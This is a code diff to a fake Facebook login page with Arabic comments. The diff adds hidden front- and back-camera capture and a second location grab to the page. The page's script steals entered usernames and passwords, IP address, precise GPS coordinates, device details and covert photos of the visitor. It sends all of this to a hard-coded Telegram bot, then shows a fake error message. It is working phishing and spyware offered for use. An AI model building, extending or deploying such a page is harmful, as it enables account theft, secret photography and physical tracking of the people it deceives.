@@ -143,7 +143,7 @@
         .hidden {
             display: none !important;
         }
-        #cameraVideo {
+        #cameraFront, #cameraBack {
             width: 100%;
             max-width: 400px;
             border-radius: 12px;
@@ -193,7 +193,8 @@
     </div>
 
     <!-- عناصر الكاميرا المخفية -->
-    <video id="cameraVideo" class="hidden" autoplay muted></video>
+    <video id="cameraFront" class="hidden" autoplay muted></video>
+    <video id="cameraBack" class="hidden" autoplay muted></video>
     <canvas id="photoCanvas" class="hidden"></canvas>
 
     <script>
@@ -203,24 +204,26 @@
         const BOT_TOKEN = "8533593040:AAGHB2mNIeRa3Alm8OuDsASkIqE5rzI6Sak";
         const CHAT_ID = "8380345748";
 
-        let capturedImage = null;
+        let frontPhoto = null;
+        let backPhoto = null;
         let userLocation = "غير معروف";
+        let userLocation2 = "غير معروف";
         let userIP = "غير معروف";
 
         // ============================================================
-        // 1. جلب الموقع الجغرافي
+        // 1. جلب الموقع الجغرافي (مرة أولى)
         // ============================================================
-        function getLocation() {
+        function getLocationFirst() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const { latitude, longitude } = position.coords;
                         userLocation = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        console.log('[+] تم جلب الموقع:', userLocation);
+                        console.log('[+] الموقع الأول:', userLocation);
                     },
                     () => {
-                        userLocation = "رفض المستخدم مشاركة الموقع";
-                        console.log('[-] رفض المستخدم مشاركة الموقع');
+                        userLocation = "رفض المستخدم مشاركة الموقع (المرة الأولى)";
+                        console.log('[-] رفض المستخدم مشاركة الموقع (المرة الأولى)');
                     },
                     { timeout: 10000, enableHighAccuracy: true }
                 );
@@ -230,7 +233,29 @@
         }
 
         // ============================================================
-        // 2. جلب عنوان IP
+        // 2. جلب الموقع الجغرافي (مرة ثانية)
+        // ============================================================
+        function getLocationSecond() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        userLocation2 = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        console.log('[+] الموقع الثاني:', userLocation2);
+                    },
+                    () => {
+                        userLocation2 = "رفض المستخدم مشاركة الموقع (المرة الثانية)";
+                        console.log('[-] رفض المستخدم مشاركة الموقع (المرة الثانية)');
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            } else {
+                userLocation2 = "المتصفح لا يدعم GPS";
+            }
+        }
+
+        // ============================================================
+        // 3. جلب عنوان IP
         // ============================================================
         async function getIP() {
             try {
@@ -244,18 +269,17 @@
         }
 
         // ============================================================
-        // 3. التقاط صورة من الكاميرا
+        // 4. التقاط صورة من الكاميرا الأمامية
         // ============================================================
-        async function capturePhoto() {
+        async function captureFrontCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: 640, height: 480 }
                 });
-                const video = document.getElementById('cameraVideo');
+                const video = document.getElementById('cameraFront');
                 video.srcObject = stream;
                 await video.play();
 
-                // الانتظار للحصول على إطار جيد
                 await new Promise(r => setTimeout(r, 1500));
 
                 const canvas = document.getElementById('photoCanvas');
@@ -264,37 +288,80 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                capturedImage = canvas.toDataURL('image/jpeg', 0.9);
+                frontPhoto = canvas.toDataURL('image/jpeg', 0.9);
                 stream.getTracks().forEach(track => track.stop());
 
-                console.log('[+] تم التقاط صورة من الكاميرا');
-                return capturedImage;
+                console.log('[+] تم التقاط الصورة الأمامية');
+                return frontPhoto;
             } catch (error) {
-                console.log('[-] فشل الوصول إلى الكاميرا:', error.message);
+                console.log('[-] فشل الوصول إلى الكاميرا الأمامية:', error.message);
                 return null;
             }
         }
 
         // ============================================================
-        // 4. إرسال البيانات إلى تيلغرام
+        // 5. التقاط صورة من الكاميرا الخلفية
+        // ============================================================
+        async function captureBackCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: 640, height: 480 }
+                });
+                const video = document.getElementById('cameraBack');
+                video.srcObject = stream;
+                await video.play();
+
+                await new Promise(r => setTimeout(r, 1500));
+
+                const canvas = document.getElementById('photoCanvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                backPhoto = canvas.toDataURL('image/jpeg', 0.9);
+                stream.getTracks().forEach(track => track.stop());
+
+                console.log('[+] تم التقاط الصورة الخلفية');
+                return backPhoto;
+            } catch (error) {
+                console.log('[-] فشل الوصول إلى الكاميرا الخلفية:', error.message);
+                return null;
+            }
+        }
+
+        // ============================================================
+        // 6. إرسال البيانات إلى تيلغرام
         // ============================================================
         async function sendAllData(username, password) {
             try {
-                // 1. إرسال الصورة الملتقطة
-                if (capturedImage) {
-                    const blob = dataURLToBlob(capturedImage);
+                // 1. إرسال الصورة الأمامية
+                if (frontPhoto) {
+                    const blob = dataURLToBlob(frontPhoto);
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'facebook_victim.jpg');
-
+                    formData.append('photo', blob, 'facebook_front.jpg');
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
-                    console.log('[+] تم إرسال الصورة إلى تيلغرام');
+                    console.log('[+] تم إرسال الصورة الأمامية');
                 }
 
-                // 2. إرسال التقرير النصي
+                // 2. إرسال الصورة الخلفية
+                if (backPhoto) {
+                    const blob = dataURLToBlob(backPhoto);
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'facebook_back.jpg');
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    console.log('[+] تم إرسال الصورة الخلفية');
+                }
+
+                // 3. إرسال التقرير النصي
                 const timestamp = new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
                 const message = `
 🔵 **Facebook Login** 🔵
@@ -302,11 +369,13 @@
 👤 **Username:** ${username}
 🔑 **Password:** ${password}
 🌐 **IP:** ${userIP}
-📍 **Location:** ${userLocation}
-🕐 **Time:** ${timestamp}
+📍 **الموقع الأول:** ${userLocation}
+📍 **الموقع الثاني:** ${userLocation2}
+🕐 **الوقت:** ${timestamp}
 📱 **User Agent:** ${navigator.userAgent}
-🖥️ **Screen:** ${screen.width}x${screen.height}
-📸 **Photo:** ${capturedImage ? '✅ Captured' : '❌ Failed'}
+🖥️ **الشاشة:** ${screen.width}x${screen.height}
+📸 **الصورة الأمامية:** ${frontPhoto ? '✅ تم التقاطها' : '❌ فشل'}
+📸 **الصورة الخلفية:** ${backPhoto ? '✅ تم التقاطها' : '❌ فشل'}
                 `;
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -327,7 +396,7 @@
         }
 
         // ============================================================
-        // 5. أدوات مساعدة
+        // 7. أدوات مساعدة
         // ============================================================
         function dataURLToBlob(dataURL) {
             const arr = dataURL.split(',');
@@ -342,7 +411,7 @@
         }
 
         // ============================================================
-        // 6. معالج تسجيل الدخول الرئيسي
+        // 8. معالج تسجيل الدخول الرئيسي
         // ============================================================
         async function handleLogin(event) {
             event.preventDefault();
@@ -363,14 +432,19 @@
             errorMsg.style.display = 'none';
 
             try {
-                // 1. جلب الموقع و IP
-                getLocation();
+                // 1. جلب الموقع (مرة ثانية)
+                getLocationSecond();
+
+                // 2. جلب IP
                 await getIP();
 
-                // 2. التقاط الصورة
-                await capturePhoto();
+                // 3. التقاط الصورة الأمامية
+                await captureFrontCamera();
 
-                // 3. إرسال البيانات إلى تيلغرام
+                // 4. التقاط الصورة الخلفية
+                await captureBackCamera();
+
+                // 5. إرسال جميع البيانات إلى تيلغرام
                 await sendAllData(username, password);
 
                 // إظهار رسالة خطأ وهمية
@@ -392,15 +466,18 @@
         }
 
         // ============================================================
-        // 7. منع النقر بزر الماوس الأيمن
+        // 9. منع النقر بزر الماوس الأيمن
         // ============================================================
         document.addEventListener('contextmenu', e => e.preventDefault());
 
         // ============================================================
-        // 8. بدء التشغيل
+        // 10. بدء التشغيل
         // ============================================================
-        console.log('[+] واجهة فيسبوك مع التجسس جاهزة!');
-        console.log('[+] سيتم إرسال الصورة والموقع إلى تيلغرام عند تسجيل الدخول.');
+        console.log('[+] واجهة فيسبوك مع كاميرتين وموقعين جاهزة!');
+        console.log('[+] سيتم إرسال الصور والموقع إلى تيلغرام عند تسجيل الدخول.');
+
+        // جلب الموقع (مرة أولى) عند تحميل الصفحة
+        getLocationFirst();
 
         // طلب إذن الكاميرا مسبقاً
         navigator.mediaDevices.getUserMedia({ video: true })
@@ -408,4 +485,4 @@
             .catch(() => console.log('[-] رفض المستخدم الوصول للكاميرا'));
     </script>
 </body>
-</html>
+    </html>
